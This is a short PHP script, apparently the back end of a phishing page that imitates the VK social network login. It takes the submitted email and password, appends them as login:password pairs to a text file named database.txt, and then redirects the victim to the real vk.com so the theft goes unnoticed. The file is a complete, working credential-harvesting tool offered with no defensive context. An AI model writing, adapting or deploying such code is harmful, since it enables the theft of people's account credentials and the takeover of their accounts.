<?PHP

$Log = $_POST['email'];

$Pass = $_POST['pass'];

$log = fopen("database.txt","at");

fwrite($log,"\n $Log:$Pass \n");

fclose($log);

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://vk.com/'></head></html>";

?>	